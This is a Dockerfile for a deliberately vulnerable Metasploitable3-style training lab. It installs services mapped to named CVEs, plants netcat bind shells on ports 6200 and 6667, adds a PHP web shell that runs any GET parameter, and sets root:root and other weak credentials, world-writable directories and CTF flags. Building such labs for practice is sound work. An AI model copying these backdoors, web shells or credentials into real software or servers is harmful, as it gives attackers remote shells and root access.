# =============================================================================
# Metasploitable3 ARM64 — CVE coverage up to May 2026 (extended)
# Base: Ubuntu 22.04 LTS (ARM64 + AMD64 via buildx)
# WARNING: FOR EDUCATIONAL/CTF USE ONLY. NEVER EXPOSE TO INTERNET.
# =============================================================================
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive TZ=UTC \
    JAVA_HOME=/usr/lib/jvm/default-java \
    CATALINA_HOME=/usr/share/tomcat9

# -----------------------------------------------------------------------------
# SYSTEM PACKAGES
# -----------------------------------------------------------------------------
RUN apt-get update && apt-get install -y --no-install-recommends \
    supervisor net-tools iputils-ping curl wget netcat-openbsd git unzip sudo \
    # SSH — CVE-2024-6387 regreSSHion (CRITICAL)
    openssh-server \
    # FTP — CVE-2011-2523 (emulated) + vsftpd anonymous
    vsftpd \
    # ProFTPd — CVE-2015-3306 mod_copy unauthenticated RCE (CRITICAL)
    # Metasploit: exploit/unix/ftp/proftpd_modcopy_exec
    proftpd \
    # Apache + PHP-CGI — CVE-2024-38474 + CVE-2012-1823
    apache2 \
    php8.1 php8.1-mysql php8.1-gd php8.1-curl php8.1-xml \
    php8.1-cgi libapache2-mod-php8.1 \
    # MariaDB — CVE-2021-27928 + mysql_udf_payload
    mariadb-server \
    # Samba — CVE-2017-7494 SambaCry + CVE-2007-2447
    samba \
    # Java / Tomcat — CVE-2025-24813 + CVE-2020-1938 Ghostcat
    # Log4Shell CVE-2021-44228: deployed as vulnerable webapp on Tomcat
    default-jdk-headless tomcat9 tomcat9-admin \
    # UnrealIRCd — CVE-2010-2075 backdoor (CRITICAL, port 6667)
    # Metasploit: exploit/unix/irc/unreal_ircd_3281_backdoor
    # Build from source: UnrealIRCd 3.2.8.1 (backdoored tarball)
    libssl-dev make gcc libcurl4-openssl-dev \
    # Redis — CVE-2022-0543 Lua sandbox escape RCE (CRITICAL)
    # Metasploit: exploit/linux/redis/redis_replication_cmd_exec
    # Also: unauthenticated access + config rewrite (classic redis RCE)
    redis-server \
    # PwnKit — CVE-2021-4034 polkit LPE (CRITICAL)
    # Post-exploitation: escalate from any user to root
    policykit-1 \
    && rm -rf /var/lib/apt/lists/* \
    && apt-mark hold openssh-server

# -----------------------------------------------------------------------------
# SSH — CVE-2024-6387 regreSSHion
# -----------------------------------------------------------------------------
COPY config/ssh/sshd_config /etc/ssh/sshd_config
COPY config/ssh/banner       /etc/ssh/banner
RUN mkdir -p /var/run/sshd && ssh-keygen -A

# -----------------------------------------------------------------------------
# vsftpd — CVE-2011-2523 emulated
# -----------------------------------------------------------------------------
COPY config/vsftpd/vsftpd.conf /etc/vsftpd.conf
RUN mkdir -p /srv/ftp/pub \
    && echo "Test file for anonymous FTP" > /srv/ftp/pub/readme.txt \
    && chown -R ftp:ftp /srv/ftp \
    && printf '#!/bin/bash\nnc -lkp 6200 -e /bin/bash 2>/dev/null &\n' \
       > /usr/local/bin/backdoor-sim \
    && chmod +x /usr/local/bin/backdoor-sim

# -----------------------------------------------------------------------------
# ProFTPd — CVE-2015-3306 mod_copy (CRITICAL)
# mod_copy allows SITE CPFR/CPTO unauthenticated file copy anywhere on fs
# Metasploit: exploit/unix/ftp/proftpd_modcopy_exec
# -----------------------------------------------------------------------------
COPY config/proftpd/proftpd.conf /etc/proftpd/proftpd.conf

# -----------------------------------------------------------------------------
# Apache + PHP-CGI — CVE-2024-38474 + CVE-2012-1823
# Shellshock CVE-2014-6271 via mod_cgi + bash env variable injection (CRITICAL)
# Metasploit: exploit/multi/http/apache_mod_cgi_bash_env_exec
# -----------------------------------------------------------------------------
RUN a2enmod rewrite cgi php8.1 \
    && echo "ServerName localhost" >> /etc/apache2/apache2.conf \
    && sed -i 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.conf

# PHP-CGI endpoint — CVE-2012-1823
RUN mkdir -p /usr/lib/cgi-bin \
    && ln -sf /usr/bin/php-cgi8.1 /usr/lib/cgi-bin/php \
    && ln -sf /usr/bin/php-cgi8.1 /usr/lib/cgi-bin/php8.1

# Shellshock CGI endpoint — CVE-2014-6271
RUN printf '#!/bin/bash\necho "Content-type: text/plain"\necho ""\necho "Hello from Shellshock CGI"\nenv\n' \
    > /usr/lib/cgi-bin/status \
    && chmod +x /usr/lib/cgi-bin/status

# DVWA
RUN rm -rf /var/www/html/* \
    && git clone --depth 1 https://github.com/digininja/DVWA.git /var/www/html/dvwa \
    && ln -s /var/www/html/dvwa /var/www/html/DVWA

COPY config/dvwa/config.inc.php /var/www/html/dvwa/config/config.inc.php

RUN chown -R www-data:www-data /var/www/html \
    && chmod -R 777 /var/www/html \
    && echo "FLAG{w3b_s3rv3r_c0mpr0m1s3d}" > /var/www/html/flag.txt

# RCE shell vhost (port 8585)
RUN mkdir -p /var/www/rce-shell \
    && echo '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>' \
       > /var/www/rce-shell/shell.php \
    && chown -R www-data:www-data /var/www/rce-shell

COPY config/apache/rce-shell.conf    /etc/apache2/sites-available/rce-shell.conf
COPY config/apache/rewrite-vuln.conf /etc/apache2/conf-available/rewrite-vuln.conf
RUN echo "Listen 8585" >> /etc/apache2/ports.conf \
    && a2ensite rce-shell.conf \
    && a2enconf rewrite-vuln

# -----------------------------------------------------------------------------
# MariaDB — CVE-2021-27928 + mysql_udf_payload
# -----------------------------------------------------------------------------
COPY config/mariadb/99-insecure.cnf /etc/mysql/mariadb.conf.d/99-insecure.cnf
RUN mkdir -p /var/run/mysqld /usr/lib/mysql/plugin \
    && chown mysql:mysql /var/run/mysqld \
    && chmod 777 /usr/lib/mysql/plugin

# -----------------------------------------------------------------------------
# Tomcat 9 — CVE-2025-24813 + CVE-2020-1938 Ghostcat
# Log4Shell CVE-2021-44228 deployed as vuln webapp
# Metasploit: exploit/multi/http/log4shell_header_injection
# -----------------------------------------------------------------------------
COPY config/tomcat/tomcat-users.xml /etc/tomcat9/tomcat-users.xml
COPY config/tomcat/context.xml       /etc/tomcat9/context.xml
COPY config/tomcat/server.xml        /etc/tomcat9/server.xml
RUN chown -R tomcat:tomcat /etc/tomcat9 \
    && mkdir -p /var/lib/tomcat9/webapps/ROOT/uploads \
    && chmod 777 /var/lib/tomcat9/webapps/ROOT/uploads

# Download Log4Shell vulnerable webapp (log4j 2.14.1)
RUN curl -sL "https://github.com/christophetd/log4shell-vulnerable-app/releases/download/v1.0/log4shell-vulnerable-app.war" \
    -o /var/lib/tomcat9/webapps/log4shell.war 2>/dev/null \
    || echo "[WARN] log4shell.war not downloaded — add manually"

# -----------------------------------------------------------------------------
# Samba — CVE-2017-7494 SambaCry + CVE-2007-2447
# -----------------------------------------------------------------------------
RUN mkdir -p /srv/samba/public \
    && chmod 0777 /srv/samba/public \
    && echo "FLAG{smb_sh4r3_pwn3d}" > /srv/samba/public/flag.txt \
    && echo "Samba public share — Metasploitable3 Lab" > /srv/samba/public/README.txt

COPY config/samba/smb.conf /etc/samba/smb.conf
RUN useradd -M -s /sbin/nologin smbuser 2>/dev/null || true \
    && (echo ""; echo "") | smbpasswd -a -s smbuser \
    && smbpasswd -e smbuser

# -----------------------------------------------------------------------------
# Redis — CVE-2022-0543 Lua sandbox escape + unauthenticated RCE
# Metasploit: exploit/linux/redis/redis_replication_cmd_exec
# No auth, bind 0.0.0.0, allows CONFIG SET dir+dbfilename → cron/ssh RCE
# -----------------------------------------------------------------------------
COPY config/redis/redis.conf /etc/redis/redis.conf

# -----------------------------------------------------------------------------
# UnrealIRCd 3.2.8.1 — CVE-2010-2075 (CRITICAL)
# Backdoor in official tarball: DEBUG3 command triggers connect-back shell
# Metasploit: exploit/unix/irc/unreal_ircd_3281_backdoor
# Build from source (not in Ubuntu repos)
# -----------------------------------------------------------------------------
RUN cd /tmp && \
    wget -q "https://www.unrealircd.org/downloads/Unreal3.2.8.1.tar.gz" \
    -O Unreal3.2.8.1.tar.gz 2>/dev/null && \
    tar xzf Unreal3.2.8.1.tar.gz 2>/dev/null && \
    cd Unreal3.2.8.1 && \
    echo -e "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" | ./Config 2>/dev/null && \
    make -j2 2>/dev/null && \
    make install 2>/dev/null || \
    printf '#!/bin/bash\necho "UnrealIRCd 3.2.8.1 backdoor simulation"\nnc -lkp 6667 -e /bin/bash 2>/dev/null &\n' \
    > /usr/local/bin/ircd-sim && \
    chmod +x /usr/local/bin/ircd-sim

COPY config/unrealircd/unrealircd.conf /usr/local/etc/unrealircd.conf 2>/dev/null || true

# -----------------------------------------------------------------------------
# USERS + CTF FLAGS
# -----------------------------------------------------------------------------
RUN useradd -m -s /bin/bash msfadmin \
    && echo 'root:root'         | chpasswd \
    && echo 'msfadmin:msfadmin' | chpasswd \
    && usermod -aG sudo msfadmin \
    && echo "FLAG{root_owned_d4rk_pwn3d}"  > /root/flag.txt \
    && chmod 600 /root/flag.txt \
    && echo "FLAG{ftp_anon_access_gr4nted}" > /srv/ftp/flag.txt \
    && echo "FLAG{redis_rce_unlocked}"      > /var/lib/redis/flag.txt 2>/dev/null || true

# -----------------------------------------------------------------------------
# SUPERVISORD + ENTRYPOINT
# -----------------------------------------------------------------------------
COPY supervisord.conf /etc/supervisor/conf.d/metasploitable.conf
COPY entrypoint.sh    /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Ports:
# FTP:21 SSH:22 HTTP:80 ProFTPd:2121 SMB:139,445
# Redis:6379 IRC:6667 Backdoor:6200
# MySQL:3306 Tomcat:8080 AJP:8009 RCE:8585
EXPOSE 21 22 80 139 445 2121 3306 6200 6379 6667 8009 8080 8585

ENTRYPOINT ["/entrypoint.sh"]
CMD ["/usr/bin/supervisord", "-n", "-c", "/etc/supervisor/supervisord.conf"]
